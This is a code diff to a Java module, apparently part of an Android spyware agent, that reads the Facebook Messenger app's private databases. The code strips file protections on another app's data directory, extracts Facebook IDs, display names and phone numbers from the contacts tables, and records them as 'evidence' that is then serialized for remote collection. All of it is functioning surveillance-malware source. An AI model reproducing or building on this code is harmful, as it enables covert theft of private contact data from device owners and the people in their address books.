@@ -116,28 +116,38 @@ public class ChatFacebook extends SubModuleChat {
 			return;
 		}
 
-		boolean updateMarkup = false;
+		try {
+			boolean updateMarkup = false;
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (readSkypeMessageHistory) account: " + account);
-		}
-
-		Path.unprotectAll(dbDir, true);
-
-		if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
-			if (Path.unprotect(dbDir, "users_db2", true)) {
-				readAddressUser();
-
-			} else if (Path.unprotect(dbDir, "contacts_db2", true)) {
-				readAddressContacts();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readFbMessageHistory) account: " + account);
 			}
-		}
 
-		return;
+			Path.unprotectAll(dbDir, true);
+
+			if (ModuleAddressBook.getInstance()!=null) {
+				if (Path.unprotect(dbDir, "users_db2", true)) {
+					readAddressUser();
+
+				} else if (Path.unprotect(dbDir, "contacts_db2", true)) {
+					readAddressContacts();
+				}
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (readFbMessageHistory) AddressBook not enabled.");
+				}
+			}
+
+		} finally {
+			readChatSemaphore.release();
+		}
 
 	}
 
 	private void readAddressUser() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (readAddressUser) ");
+		}
 		String dbFile = "users_db2";
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
 		SQLiteDatabase db = helper.getReadableDatabase();
@@ -152,30 +162,32 @@ public class ChatFacebook extends SubModuleChat {
 	}
 
 	private void readAddressContacts() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (readAddressContacts) ");
+		}
 		String dbFile = "contacts_db2";
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
 		SQLiteDatabase db = helper.getReadableDatabase();
 
 		RecordListVisitor visitor = new RecordListVisitor("data");
 		helper.traverseRecords("contacts", visitor);
-
+		boolean serializeContacts = false;
 		for (String value : visitor.getList()) {
 			try {
 				JSONObject root = (JSONObject) new JSONTokener(value).nextValue();
-				String fbId =  root.getString("profileFbid");
+				String fbId = root.getString("profileFbid");
 				JSONObject name = root.getJSONObject("name");
 				String fullName = name.getString("displayName");
-				
-				JSONArray phones =  root.getJSONArray("phones");
-				String numbers="";
-				for(int i = 0; i< phones.length(); i++){
-					numbers += phones.getJSONObject(i).get("universalNumber")+" ";
+
+				JSONArray phones = root.getJSONArray("phones");
+				String numbers = "";
+				for (int i = 0; i < phones.length(); i++) {
+					numbers += phones.getJSONObject(i).get("universalNumber") + " ";
 				}
-				
-				//String picture = root.getString("bigPictureUrl");
-				
-				Contact contact = new Contact(fbId, numbers, fullName,  "");
-				ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.FACEBOOK, contact);
+				// String picture = root.getString("bigPictureUrl");
+
+				Contact contact = new Contact(fbId, numbers, fullName, "Id: " + fbId);
+				serializeContacts |= ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.FACEBOOK, contact);
 
 			} catch (JSONException e) {
 				if (Cfg.DEBUG) {
@@ -183,39 +195,8 @@ public class ChatFacebook extends SubModuleChat {
 				}
 			}
 		}
+		if(serializeContacts){
+			ModuleAddressBook.getInstance().serializeContacts();
+		}
 	}
-
-	/*
-	 * private void readFbMessageHistory() throws IOException{ if (Cfg.DEBUG) {
-	 * Check.log(TAG + " (readChatMessages)"); }
-	 * 
-	 * if (!readChatSemaphore.tryAcquire()) { if (Cfg.DEBUG) { Check.log(TAG +
-	 * " (readSkypeMessageHistory), semaphore red"); } return; } try { boolean
-	 * updateMarkup = false;
-	 * 
-	 * // k_0=/data/data/com.skype.raider/files //String dbDir =
-	 * Messages.getString("k_0"); String dbDir =
-	 * "/data/data/com.facebook.orca/databases"; String dbFile = "users_db2";
-	 * Path.unprotect(dbDir, true);
-	 * 
-	 * String account = readAccount(); if (account == null || account.length()
-	 * == 0) return;
-	 * 
-	 * if (Cfg.DEBUG) { Check.log(TAG + " (readSkypeMessageHistory) account: " +
-	 * account); } // k_1=/main.db String dbFile = dbDir + "/" + account +
-	 * Messages.getString("k_1");
-	 * 
-	 * Path.unprotect(dbDir + "/" + account, true); Path.unprotect(dbFile,
-	 * true); Path.unprotect(dbFile + "-journal", true);
-	 * 
-	 * File file = new File(dbFile);
-	 * 
-	 * if (file.canRead()) { if (Cfg.DEBUG) { Check.log(TAG +
-	 * " (readSkypeMessageHistory): can read DB"); }
-	 * 
-	 * GenericSqliteHelper helper = GenericSqliteHelper.open(dbFile);
-	 * 
-	 * } }
-	 */
-
 }
